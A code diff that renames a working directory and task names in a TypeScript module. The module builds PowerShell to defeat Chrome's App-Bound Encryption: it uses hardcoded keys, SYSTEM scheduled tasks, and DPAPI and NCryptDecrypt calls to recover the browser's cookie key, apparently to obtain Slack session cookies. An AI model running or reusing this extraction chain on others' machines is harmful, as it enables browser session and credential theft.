@@ -26,7 +26,7 @@ const FLAG1_AES_KEY   = Buffer.from("b31c6e241ac846728da9c1fac4936651cffb944d143
 const FLAG2_CHACHA_KEY = Buffer.from("e98f37d7f4e1fa433d19304dc2258042090e2d1d7eea7670d41f738d08729660", "hex");
 const FLAG3_XOR_KEY   = Buffer.from("ccf8a1cec56605b8517552ba1a2d061c03a29e90274fb2fcf59ba4b75c392390", "hex");
 
-const WORK_DIR = "C:\\ProgramData\\slack-term-abe";
+const WORK_DIR = "C:\\ProgramData\\slack-hub-abe";
 
 function chromeUserDataDir(): string {
   const localAppData = process.env.LOCALAPPDATA ?? join(process.env.USERPROFILE ?? "", "AppData", "Local");
@@ -38,10 +38,10 @@ function chromeUserDataDir(): string {
 // and their escaping pitfalls. WORK_DIR is a fixed constant, so nothing needs interpolation here.
 export const PS_INNER_DPAPI = String.raw`try {
   Add-Type -AssemblyName System.Security
-  $d = [IO.File]::ReadAllBytes('C:\ProgramData\slack-term-abe\in.bin')
+  $d = [IO.File]::ReadAllBytes('C:\ProgramData\slack-hub-abe\in.bin')
   $o = [Security.Cryptography.ProtectedData]::Unprotect($d, $null, 'CurrentUser')
-  [IO.File]::WriteAllBytes('C:\ProgramData\slack-term-abe\sys.bin', $o)
-} catch { Set-Content 'C:\ProgramData\slack-term-abe\dpapi.err' ($_.Exception.Message) }
+  [IO.File]::WriteAllBytes('C:\ProgramData\slack-hub-abe\sys.bin', $o)
+} catch { Set-Content 'C:\ProgramData\slack-hub-abe\dpapi.err' ($_.Exception.Message) }
 `;
 
 export const PS_INNER_CNG = String.raw`try {
@@ -58,8 +58,8 @@ public static class NC {
     byte[] o=new byte[n]; s=NCryptDecrypt(k,input,input.Length,IntPtr.Zero,o,n,out n,0x40); if(s!=0) throw new Exception("d2 "+s);
     byte[] r=new byte[n]; Array.Copy(o,r,n); return r; } }
 '@
-  [IO.File]::WriteAllBytes('C:\ProgramData\slack-term-abe\cng.bin', [NC]::Dec([IO.File]::ReadAllBytes('C:\ProgramData\slack-term-abe\eak.bin')))
-} catch { Set-Content 'C:\ProgramData\slack-term-abe\cng.err' ($_.Exception.Message) }
+  [IO.File]::WriteAllBytes('C:\ProgramData\slack-hub-abe\cng.bin', [NC]::Dec([IO.File]::ReadAllBytes('C:\ProgramData\slack-hub-abe\eak.bin')))
+} catch { Set-Content 'C:\ProgramData\slack-hub-abe\cng.err' ($_.Exception.Message) }
 `;
 
 /**
@@ -72,14 +72,14 @@ export function buildHelperPs(userDataDir: string, profileDir: string): string {
   return String.raw`
 $ErrorActionPreference = 'Stop'
 Add-Type -AssemblyName System.Security
-$work = 'C:\ProgramData\slack-term-abe'
+$work = 'C:\ProgramData\slack-hub-abe'
 New-Item -ItemType Directory -Force -Path $work | Out-Null
 Remove-Item "$work\sys.bin","$work\out.bin","$work\eak.bin","$work\cng.bin","$work\cng.err","$work\Cookies","$work\log.txt" -ErrorAction SilentlyContinue
 Start-Transcript -Path "$work\log.txt" -Force | Out-Null
 trap { Write-Host ("ERROR: " + $_.Exception.Message); try { Stop-Transcript | Out-Null } catch {}; exit 1 }
 
 function Run-SystemTask($name, $sp) {
-  # $sp is always under C:\ProgramData\slack-term-abe (no spaces), so no inner quoting is needed.
+  # $sp is always under C:\ProgramData\slack-hub-abe (no spaces), so no inner quoting is needed.
   schtasks /Create /F /RU SYSTEM /SC ONCE /ST 00:00 /TN $name /TR "powershell -NonInteractive -ExecutionPolicy Bypass -File $sp" | Out-Null
   schtasks /Run /TN $name | Out-Null
 }
@@ -94,9 +94,9 @@ if ([Text.Encoding]::ASCII.GetString($appb[0..3]) -ne 'APPB') { throw 'app_bound
 [IO.File]::WriteAllBytes("$work\in.bin", $appb[4..($appb.Length-1)])
 
 # 2) SYSTEM DPAPI (inner_dpapi.ps1 written separately)
-Run-SystemTask 'slack_term_abe_dpapi' "$work\inner_dpapi.ps1"
+Run-SystemTask 'slack_hub_abe_dpapi' "$work\inner_dpapi.ps1"
 for ($i=0; $i -lt 100 -and -not (Test-Path "$work\sys.bin"); $i++) { Start-Sleep -Milliseconds 100 }
-schtasks /Delete /F /TN 'slack_term_abe_dpapi' | Out-Null
+schtasks /Delete /F /TN 'slack_hub_abe_dpapi' | Out-Null
 if (-not (Test-Path "$work\sys.bin")) { throw 'SYSTEM DPAPI produced no output' }
 
 # 3) user DPAPI (this elevated shell is the user)
@@ -108,9 +108,9 @@ $headerLen = [BitConverter]::ToUInt32($out, 0)
 $flagOff = 4 + $headerLen + 4
 if ($out[$flagOff] -eq 3) {
   [IO.File]::WriteAllBytes("$work\eak.bin", $out[($flagOff+1)..($flagOff+32)])
-  Run-SystemTask 'slack_term_abe_cng' "$work\inner_cng.ps1"
+  Run-SystemTask 'slack_hub_abe_cng' "$work\inner_cng.ps1"
   for ($i=0; $i -lt 150 -and -not (Test-Path "$work\cng.bin"); $i++) { Start-Sleep -Milliseconds 100 }
-  schtasks /Delete /F /TN 'slack_term_abe_cng' | Out-Null
+  schtasks /Delete /F /TN 'slack_hub_abe_cng' | Out-Null
   if (-not (Test-Path "$work\cng.bin")) { $e = if (Test-Path "$work\cng.err") { Get-Content "$work\cng.err" } else { '' }; throw "SYSTEM NCryptDecrypt failed $e" }
 }
 
